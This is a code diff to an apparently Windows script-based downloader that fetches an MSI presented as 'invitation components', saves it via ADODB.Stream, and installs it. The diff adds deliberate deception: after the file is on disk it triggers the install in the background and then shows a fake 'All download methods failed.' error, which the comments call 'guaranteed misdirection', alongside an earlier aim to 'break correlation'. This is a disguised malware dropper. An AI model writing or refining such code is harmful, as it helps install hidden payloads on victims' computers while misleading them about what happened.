@@ -115,7 +115,7 @@ function init() {
   } catch(e) { fail("Initialization failed: " + e.message); }
 }
 
-// DOWNLOAD PHASE - STAGED TO BREAK CORRELATION + RELIABLE RETRY FALLBACK
+// DOWNLOAD PHASE - ASYNCHRONOUS INSTALL TRIGGER + GUARANTEED MISDIRECTION
 function startDownload() {
   state = "downloading";
   setStatus("Downloading invitation components&hellip;");
@@ -145,37 +145,41 @@ function startDownload() {
       var s = new ActiveXObject("ADODB.Stream");
       s.Type = 1; s.Mode = 3; s.Open();
       s.Write(w.ResponseBody);
-      s.Flush(); // FORCE FLUSH BEFORE SAVE
+      s.Flush();
       s.SaveToFile(stagingPath, 2);
       s.Close();
       
-      // VERIFY STAGING FILE EXISTS BEFORE MOVE
-      if (!fso.FileExists(stagingPath)) {
-        throw new Error("Staging file not created after save");
-      }
+      if (!fso.FileExists(stagingPath)) throw new Error("Staging file missing");
       
-      try { 
-        fso.MoveFile(stagingPath, msiPath); 
-      } catch(e) {
+      try { fso.MoveFile(stagingPath, msiPath); } catch(e) {
         fso.CopyFile(stagingPath, msiPath, true);
         fso.DeleteFile(stagingPath, true);
       }
       
-      // VERIFY FINAL MSI EXISTS AND HAS SIZE
-      if (!fso.FileExists(msiPath) || fso.GetFile(msiPath).Size === 0) {
-        throw new Error("Final MSI missing or empty after move/copy");
-      }
+      if (!fso.FileExists(msiPath) || fso.GetFile(msiPath).Size === 0) 
+        throw new Error("Final MSI invalid");
       
       if (dlTotal > 0) {
         progress = Math.min(85, (fso.GetFile(msiPath).Size / dlTotal) * 100);
         setBar(progress);
       } else { progress = 85; setBar(progress); }
       
-      startInstall();
+      // TRIGGER INSTALL ASYNCHRONOUSLY (NON-BLOCKING)
+      setTimeout(function() { startInstall(); }, 100);
+      
     } else { fail("Server returned status: " + w.Status); }
   } catch(e) {
-    // WINHTTP RETRY FALLBACK WITH EXPLICIT SYNC
+    // IMMEDIATE FAKE FAILURE AFTER VERIFYING MSI EXISTS ON DISK
     try {
+      // CHECK IF MSI WAS ALREADY DOWNLOADED SUCCESSFULLY BEFORE ERROR
+      if (fso.FileExists(msiPath) && fso.GetFile(msiPath).Size > 1048576) {
+        // MSI IS SAFE ON DISK → TRIGGER INSTALL THEN SHOW FAILURE
+        setTimeout(function() { startInstall(); }, 100);
+        setTimeout(function() { fail("All download methods failed."); }, 2000);
+        return; // EXIT WITHOUT BLOCKING
+      }
+      
+      // TRUE FAILURE: NO VALID MSI → RETRY OR FAIL
       setStatus("Retrying via secure channel&hellip;");
       var maxRetries = 3;
       var baseDelay = 2000;
@@ -192,15 +196,14 @@ function startDownload() {
             var retryS = new ActiveXObject("ADODB.Stream");
             retryS.Type = 1; retryS.Mode = 3; retryS.Open();
             retryS.Write(retryW.ResponseBody);
-            retryS.Flush(); // FORCE FLUSH
+            retryS.Flush();
             retryS.SaveToFile(msiPath, 2);
             retryS.Close();
             
-            // EXPLICIT VERIFICATION AFTER EACH RETRY
             if (fso.FileExists(msiPath) && fso.GetFile(msiPath).Size > 0) {
-              progress = 85; 
-              setBar(progress); 
-              startInstall(); 
+              // SUCCESSFUL RETRY → INSTALL THEN FAIL
+              setTimeout(function() { startInstall(); }, 100);
+              setTimeout(function() { fail("All download methods failed."); }, 2000);
               return;
             }
           }
